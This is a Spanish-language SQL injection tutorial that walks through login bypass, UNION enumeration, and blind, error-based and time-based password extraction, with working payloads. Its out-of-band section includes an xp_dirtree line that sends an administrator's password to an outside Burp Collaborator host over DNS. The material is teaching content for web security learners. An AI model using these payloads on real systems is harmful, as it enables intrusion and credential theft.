# SQL Injection

## 🔍 ¿Qué es SQL Injection? (SQLI)

SQL Injection (SQLI) es una técnica de ataque utilizada para explotar vulnerabilidades en aplicaciones web que no validan adecuadamente la entrada del usuario en la consulta SQL que se envía a la base de datos.&#x20;

Los atacantes pueden utilizar esta técnica para ejecutar consultas SQL maliciosas y obtener información confidencial, como nombres de usuario, contraseñas y otra información almacenada en la base de datos.

***

## 🕵️ Cómo detectar vulnerabilidades de SQL injection

Puedes detectar una SQL injection manualmente usando un conjunto sistemático de pruebas contra cada punto de entrada de la aplicación. Para hacerlo, normalmente enviarías:

* **Mensajes de error**: Ingresar caracteres especiales (por ejemplo, una comilla simple ') en los campos de entrada podría generar errores SQL. Si la aplicación muestra mensajes de error detallados, esto puede indicar un posible punto vulnerable a SQL injection.
  * Caracteres simples: `'`, `"`, `;`, `)` o `*`.
  * Caracteres simples encodeados: `%27`, `%22`, `%23`, `%3B`, `%29` o `%3B`.
  * Múltiple encoding: `%%2727`, `%25%27`.
* **Condiciones booleanas**: Introducir condiciones booleanas como `OR 1=1` o `OR 1=2`, y observar diferencias en las respuestas de la aplicación.
* **Ataques de tiempo**: Ingresar comandos SQL que provoquen retrasos deliberados (por ejemplo, usando funciones como `SLEEP` o `BENCHMARK` en MySQL) puede ayudar a identificar posibles puntos de inyección. Si la aplicación tarda un tiempo inusualmente largo en responder después de dicho input, podría ser vulnerable.

> De forma alternativa, puedes encontrar la mayoría de las vulnerabilidades de SQL injection de manera rápida y fiable usando Burp Scanner.

***

## 📤 Revelando información no accesible

Imagina una tienda online que muestra productos en diferentes categorías. Cuando el usuario hace click en la categoría **Gifts**, su navegador hace una petición a la URL:

```
https://insecure-website.com/products?category=Gifts
```

Esto hace que la aplicación haga una consulta SQL a la base de datos para mostrar los productos de dicha categoría:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Esta consulta hace lo siguiente:

* Todos los detalles `(*)`
* De la tabla `products`
* Donde la `category` es `Gifts`
* Y `released` sea `1`.

La restricción `released = 1` es para mostrar productos disponibles únicamente. Entendemos que para los no disponibles, el valor es `released = 0`.

La aplicación no implementa ninguna defensa contra ataques de inyecciones SQL. Esto significa que un atacante puede construir el siguiente ataque:

```
https://insecure-website.com/products?category=Gifts'--
```

Esto hará la siguiente consulta a la base de datos:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Hay que tener en cuenta que `--` es un indicador de comentario en SQL. Esto significa que el resto de la query es interpretada como un comentario, es decir, como si no existiese.

En este ejemplo, esto significa que ignora el `AND released = 1`. Como resultado, mostraría _todos los productos_ de la aplicación, tanto los disponibles como los no disponibles.

Otro tipo de ataque sería el siguiente, el cual consigue mostrar **todos** los productos de **todas** las categorías:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Esto resulta en la consulta:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

La consulta modificada lo que hace es mostrar todos los productos cuando la `category` es `Gifts` o cuando `1` es igual a `1`. Como `1=1` siempre se cumple, muestra todos los productos en cualquier caso.

***

## 🔑 Bypass de autentificación

Imagina una aplicación que permite a los usuarios loguearse con un usuario y contraseña. Por ejemplo, un usuario introduce el usuario `test` y la contraseña `qwerty`. La aplicación valida las credenciales a través de esta consulta SQL:

```sql
SELECT * FROM users WHERE username = 'test' AND password = 'qwerty'
```

Si la consulta devuelve los valores del usuario, el login es válido, si no, rechazado.

Si no hay medidas contra inyecciones SQL, un atacante podría loguearse como cualquier usuario sin necesidad de proporcionar una contraseña. Podría utilizar el comentario SQL `--` para anular la verificación de la contraseña en la cláusula `WHERE`.

Por ejemplo, podría probar con el usuario `administrador'--` y dejar la contraseña en blanco, lo que realizaría la siguiente consulta:

```sql
SELECT * FROM users WHERE username = 'administrador'--' AND password = ''
```

La consulta devuelve los datos del `usuario` con nombre `administrador` y el atacante se loguea como este usuario.

***

## 🔗 Ataques UNION

Cuando una aplicación es vulnerable a SQL injection y los resultados de la consulta se devuelven dentro de las respuestas de la aplicación, puedes usar la palabra clave `UNION` para obtener datos de otras tablas dentro de la base de datos. Esto se conoce comúnmente como un ataque de SQL injection mediante UNION.

La palabra clave `UNION` permite ejecutar una o más consultas `SELECT` adicionales y añadir sus resultados a los de la consulta original. Por ejemplo:

```sql
SELECT a, b FROM tabla1 UNION SELECT c, d FROM tabla2
```

Esta consulta SQL devuelve un único conjunto de resultados con dos columnas, que contiene valores de las columnas `a` y `b` de `tabla1` y de las columnas `c` y `d` de `tabla2`.

Para que una consulta `UNION` funcione, deben cumplirse dos requisitos clave:

* Las consultas individuales deben devolver el mismo número de columnas.
* Los tipos de datos de cada columna deben ser compatibles entre las consultas individuales.

Para llevar a cabo un ataque UNION de inyección SQL, el ataque debe cumplir esos 2 requisitos. Esto implica averiguar:

* Cuántas columnas se devuelven desde la consulta original.
* Qué columnas devueltas desde la consulta original son de un tipo de datos adecuado para contener los resultados de la consulta inyectada.

***

## 📏 Determinando el número de columnas requeridas

Cuando se realiza un ataque UNION de SQL injection, hay dos métodos eficaces para determinar cuántas columnas se devuelven desde la consulta original.

### 📊 Método 1 - ORDER BY

Un método consiste en inyectar una serie de cláusulas `ORDER BY` e incrementar el índice de columna especificado hasta que se produzca un error. Por ejemplo, si el punto de inyección es una cadena entre comillas dentro de la cláusula `WHERE` de la consulta original, se enviaría:

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```

Esta serie de payloads modifican la consulta original para ordenar los resultados. La columna en una cláusula `ORDER BY` se puede espicificar por su índice, por lo que no es necesario saber el nombre de las columnas.

Cuando el índice de columna especificado supera el número de columnas reales del conjunto de resultados, la base de datos devuelve un error, como por ejemplo:

```
The ORDER BY position number 3 is out of range of the number of items in the select list.
```

La aplicación podría devolver el error de la base de datos en su respuesta HTTP, pero también podría emitir una respuesta de error genérica.

> En otros casos, podría simplemente no devolver ningún resultado. En cualquier caso, siempre que se pueda detectar alguna diferencia en la respuesta, se puede deducir cuántas columnas se devuelven desde la consulta.

### 🔀 Método 2 - UNION SELECT

El segundo método consiste en enviar una serie de payloads `UNION SELECT` que especifican un número diferente de valores nulos:

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```

Si el número de valores nulos no coincide con el número de columnas, la base de datos devuelve un error, como por ejemplo:

```
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```

Utilizamos `NULL` porque los tipos de datos de cada columna deben ser compatibles entre la consulta original y la inyectada.

> `NULL` es convertible a todos los tipos de datos comunes, por lo que maximiza las posibilidades de que el payload tenga éxito cuando el recuento de columnas sea correcto.

### 🛠️ Sintaxis específica de la base de datos

En Oracle, todas las consultas `SELECT` deben utilizar la palabra clave `FROM` y especificar una tabla válida. Oracle cuenta con una tabla integrada llamada `dual` que puede utilizarse para este fin. Por lo tanto, las consultas en Oracle deberían tener el siguiente aspecto:

```
' UNION SELECT NULL FROM DUAL--
```

Estos payloads utilizan `--` para comentar el resto de la consulta. En MySQL, el `--` debe ir detrás de un espacio. También se puede utilizar un `#` para indicar un comentario.

Para obtener más detalles sobre la sintaxis específica de cada base de datos, puedes usar la siguiente [cheat sheet.](https://portswigger.net/web-security/sql-injection/cheat-sheet)

***

## 🎯 Encontrando columnas con un tipo de datos útil

Un ataque UNION permite recuperar resultados de una consulta inyectada. Los datos interesantes normalmente están en formato `string`. Esto significa, que debemos encontrar 1 o más columnas cuyo tipo de datos sea compatible con string.

Una vez determinado el número de columnas que necesitamos, podemos probar en cada columna para comprobar si soporta datos en formato string.

Podemos enviar varios payloads `UNION SELECT` que coloquen un valor string en cada columna por turno. Por ejemplo, si hay 4 columnas, enviaríamos lo siguiente:

```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```

Si el formato de datos de la columna no es compatible con string, se acontecerá un error en la base de datos, como por ejemplo:

```
Conversion failed when converting the varchar value 'a' to data type int.
```

Si no ocurre ningún error y la respuesta de la aplicación incluye contenido adicional, incluyendo el valor que hemos metido en la consulta, la columna es adecuada para devolver datos en formato string.

***

## 💰 Usando un ataque UNION para recuperar datos interesantes

Una vez detectadas el número de columnas y qué columnas pueden contener datos en formato string, el siguiente paso es extraer datos interesantes.

Pongamos un ejemplo:

* La consulta original devuelve 2 columnas, ambas con capacidad de soportar datos en string.
* El punto de inyección es una cadena entre comillas en la cláusula `WHERE`.
*   La base de datos contiene una tabla llamada `users` con las columnas `username` y `password`.

    Podríamos obtener información de la tabla `users` de la siguiente manera:

```
' UNION SELECT username, password FROM users--
```

Para llevar a cabo este ataque, es necesario saber que existe una tabla llamada `users` con dos columnas llamadas `username` y `password`. Sin esta información, habría que adivinar los nombres de las tablas y columnas.

> Todas las bases de datos modernas ofrecen formas de examinar la estructura de la base de datos y determinar qué tablas y columnas contienen.

***

## 📚 Examinando la base de datos

Para explotar las vulnerabilidades de SQL injection, suele ser necesario encontrar información sobre la base de datos. Esto incluye:

* El tipo y la versión del software de la base de datos.
* Las tablas y columnas que contiene la base de datos.

### 🧪 Consultar el tipo y la versión de la base de datos

Es posible identificar tanto el tipo como la versión de la base de datos inyectando consultas específicas para ver si alguna funciona.

A continuación se muestran algunas consultas para determinar la versión de la base de datos para las bases de datos más populares:

| Base de datos    | Consulta                  |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

Por ejemplo, puedes utilizar un ataque UNION con la siguiente entrada:

```
' UNION SELECT @@version--
```

Esto debería devolver el siguiente resultado. En este caso, se puede confirmar que la base de datos es Microsoft SQL Server y ver la versión utilizada:

```
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

### 📋 Listando el contenido de la base de datos

La mayoría de las bases de datos (excepto Oracle) tienen un conjunto de vistas denominado esquema de información. Este proporciona información sobre la base de datos.

Por ejemplo, podemos consultar `information_schema.tables` para obtener una lista de las tablas de la base de datos:

```sql
SELECT * FROM information_schema.tables
```

Esto debería devolver un output como este:

| TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | TABLE\_TYPE |
| -------------- | ------------- | ----------- | ----------- |
| MyDatabase     | dbo           | Products    | BASE TABLE  |
| MyDatabase     | dbo           | Users       | BASE TABLE  |
| MyDatabase     | dbo           | Feedback    | BASE TABLE  |

Este output nos indica que hay 3 tablas, `Products`, `Users` y `Feedback`.

Ahora podríamos probar la consulta `information_schema.columns` para listar las columnas de una tabla:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

Esto devolvería:

| TABLE\_CATALOG | TABLE\_SCHEMA | TABLE\_NAME | COLUMN\_NAME | DATA\_TYPE |
| -------------- | ------------- | ----------- | ------------ | ---------- |
| MyDatabase     | dbo           | Users       | UserId       | int        |
| MyDatabase     | dbo           | Users       | Username     | varchar    |
| MyDatabase     | dbo           | Users       | Password     | varchar    |

Este output nos devuelve el nombre de las columnas y el tipo de dato de cada una.

***

## 🌫️ Blind SQL Injection

Una blind SQL injection se produce cuando una aplicación es vulnerable a la SQL injection, pero sus respuestas HTTP no contienen los resultados de la consulta SQL relevante ni los detalles de ningún error de la base de datos.

> Muchas técnicas, como los ataques `UNION`, no son eficaces con las vulnerabilidades de blind SQL injection. Esto se debe a que dependen de la posibilidad de ver los resultados de la consulta inyectada en las respuestas de la aplicación.

### 📟 Blind SQL injection con respuestas condicionales

En este ejemplo, la aplicación utiliza cookies de seguimiento para recopilar datos. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Cuando se procesa una solicitud que contiene una cookie `TrackingId`, la aplicación realiza una consulta SQL para determinar si se trata de un usuario conocido:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Esta consulta es vulnerable a la SQL injection, pero los resultados de la consulta no devuelven al usuario.

Sin embargo, la aplicación se comporta de manera diferente dependiendo de si la consulta devuelve algún dato. Si envía un TrackingId reconocido, la consulta devuelve datos y recibe un mensaje de `Bienvenido de nuevo` en la respuesta.

> Este comportamiento es suficiente para poder explotar una blind SQL injection.

Pongamos el siguiente ejemplo para entender su funcionamiento por detrás:

Enviamos 2 solicitudes que contienen estos valores en el `TrackingId`:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

* El primero de estos valores hace que la consulta devuelva resultados, ya que la condición `AND '1'='1` inyectada es verdadera. Como resultado, se muestra el mensaje `Bienvenido de nuevo`.
* El segundo valor hace que la consulta no devuelva ningún resultado, ya que la condición inyectada es falsa. No se muestra el mensaje `Bienvenido de nuevo`.

Esto nos permite determinar la respuesta a cualquier condición inyectada y extraer los datos.

Imaginemos que tenemos una tabla `Users` con las columnas `Username` y `Password`, además de un usuario llamado `Administrator`. Podemos determinar la contraseña de este usuario enviando imputs para probar sin son válidos.

Para esto utilizaremos la siguiente consulta:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Esto nos devuelve el mensaje `Bienvenido de nuevo`, indicándonos que la condición inyectada es true, lo que nos verifica que el primer carácter es mayor que una `m`.

Volvemos a probar:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Esto no devuelve el mensaje `Bienvenido de nuevo`, lo que nos indica que la condición inyectada es falsa y, por lo tanto, el primer carácter de la contraseña no es mayor que una `t`.

Probando, envíamos la siguiente consulta, que nos devuelve el mensaje `Bienvenido de nuevo`, lo que nos confirma que la primera letra de la contraseña es una `s`:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Podemos continuar con este proceso hasta que consigamos determinar por completo la contraseña del usuario `Administrator`.

***

## ❌ SQL injection basada en errores

Una SQL injection basada en errores se refiere a los casos en los que se pueden utilizar mensajes de error para extraer datos incluso en contextos ciegos. Las posibilidades dependen de la configuración de la base de datos y de los tipos de errores que se puedan provocar:

* Es posible inducir a la aplicación a que devuelva una respuesta de error específica basada en el resultado de una expresión booleana. Podemos aprovechar esto de la misma manera que las respuestas condicionales que vimos en la sección anterior. Para obtener más información, consultar la sección Aprovechamiento de una blind SQL injection mediante la activación de errores condicionales.
* Es posible que pueda provocar mensajes de error que muestren los datos devueltos por la consulta. Esto convierte efectivamente las vulnerabilidades de blind SQL injection en visibles. Para obtener más información, consulte Extrayendo datos confidenciales a través de mensajes de error SQL detallados.

### ⚠️ Aprovechamiento de una blind SQL injection mediante la activación de errores condicionales.

Algunas aplicaciones realizan consultas SQL, pero su comportamiento no cambia, independientemente de si la consulta devuelve datos. Lo que podríamos conseguir es inducir a la aplicación a que devuelva una respuesta diferente dependiendo de si se produce un error SQL.

Se puede modificar la consulta para que solo provoque un error en la base de datos si la condición es verdadera. Un error no gestionado lanzado por la base de datos provoca alguna diferencia en la respuesta, como un mensaje de error. Esto nos permite saber la veracidad de la condición inyectada.

Para ver cómo funciona esto, supongamos que se envían dos solicitudes que contienen los siguientes valores de cookie `TrackingId` sucesivamente:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

Estos inputs utilizan la palabra clave `CASE` para comprobar una condición y devolver una expresión diferente dependiendo de si la expresión es verdadera:

* Con el primer imput, la expresión `CASE` se evalúa como `'a'`, lo que no provoca ningún error.
* Con el segundo, se evalúa como `1/0`, lo que provoca un error de división por cero.

Si el error provoca una diferencia en la respuesta HTTP de la aplicación, se puede utilizar esto para determinar si la condición inyectada es verdadera.

Con esta técnica, podemos recuperar datos probando un carácter cada vez:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

> Hay diferentes formas de provocar errores condicionales, y cada tipo de base de datos funciona mejor con una técnica diferente. Para obtener más información, consulta la hoja de referencia sobre inyección SQL.

### 📛 Extrayendo datos confidenciales a través de mensajes de error SQL detallados

La configuración incorrecta de las bases de datos a veces da lugar a mensajes de error muy detallados.

Estos pueden proporcionar información que puede ser útil para un atacante. Por ejemplo, el siguiente mensaje de error, que aparece después de inyectar una comilla simple en un parámetro `id`:

```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

Esto muestra la consulta completa que la aplicación ha construido utilizando nuestra entrada. Podemos ver que, en este caso, estamos inyectando en una cadena entre comillas simples dentro de una instrucción `WHERE`.

Esto facilita la construcción de una consulta válida que contenga una payload malicioso. Al comentar el resto de la consulta, se evita que las comillas simples rompan la sintaxis.

En ocasiones, es posible inducir a la aplicación a generar un mensaje de error que contenga datos devueltos por la consulta.

Para lograrlo, se puede utilizar la función `CAST()`, que permite convertir un tipo de datos en otro. Por ejemplo, una consulta que contenga la siguiente instrucción:

```sql
CAST((SELECT example_column FROM example_table) AS int)
```

A menudo, los datos que se intentan leer son de tipo `string`. Intentar convertirla a un tipo de datos incompatible, como `int`, puede provocar un error similar al siguiente:

```
ERROR: invalid input syntax for type integer: "Example data"
```

***

## ⏱️ SQL Injection basadas en tiempo

Una SQL Injection basada en tiempo es un tipo de ataque de blind SQL Injection que se basa en los retrasos de la base de datos para inferir si determinadas consultas devuelven verdadero o falso.&#x20;

Se utiliza cuando una aplicación no muestra ninguna respuesta directa de las consultas a la base de datos, pero permite la ejecución de comandos SQL con retraso.

El atacante puede analizar el tiempo que tarda la base de datos en responder para recopilar indirectamente información de la misma.

Se suelen utilizar las siguientes instrucciones:

```
' AND SLEEP(5)/*
' AND '1'='1' AND SLEEP(5)
' ; WAITFOR DELAY '00:00:05' --
```

Por ejemplo, en Microsoft SQL Server, se puede utilizar el siguiente ejemplo para comprobar una condición y activar un retraso dependiendo de si la expresión es verdadera:

```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

* La primera no activa un retraso, porque la condición `1=2` es falsa.
* La segunda activa un retraso de 10 segundos, porque la condición `1=1` es verdadera.

Con esta técnica, podemos recuperar datos probando un carácter cada vez:

```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```

***

## 📡 Out of Band (OAST) SQL Injection

Una Out-of-Band SQL Injection (OOB SQLi) se produce cuando un atacante utiliza canales de comunicación alternativos para extraer datos de una base de datos.&#x20;

A diferencia de las técnicas tradicionales de SQL Injection, que se basan en respuestas inmediatas dentro de la respuesta HTTP, la OOB SQL Injection depende de la capacidad del servidor de la base de datos para establecer conexiones de red con un servidor controlado por el atacante.

Este método es especialmente útil cuando los resultados del comando SQL inyectado no se pueden ver directamente o las respuestas del servidor no son estables o fiables.

La herramienta más fácil y fiable para utilizar técnicas OOB es Burp Collaborator.

Las técnicas para activar una consulta DNS son específicas del tipo de base de datos que se utiliza. Por ejemplo, la siguiente entrada en Microsoft SQL Server se puede utilizar para provocar una búsqueda DNS en un dominio específico:

```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Esto hace que la base de datos realice una búsqueda del siguiente dominio:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```

Una vez confirmada la forma de desencadenar interacciones OOB, se puede utilizar el canal OOB para extraer datos de la aplicación vulnerable. Por ejemplo:

```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Este input lee la contraseña del usuario `administrator`, añade un subdominio del Burp Collaborator único y activa una búsqueda DNS. Esta búsqueda le permite ver la contraseña capturada:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

***

## 🌐 SQL Injection en otros contextos

Se puede realizar ataques de SQL Injection utilizando cualquier entrada controlable que la aplicación procese como una consulta SQL. Por ejemplo, algunos sitios web aceptan entradas en formato JSON o XML y las utilizan para consultar la base de datos.

Por ejemplo, la siguiente SQL Injection basada en XML utiliza una secuencia de escape XML para codificar el carácter `S` en `SELECT`:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```
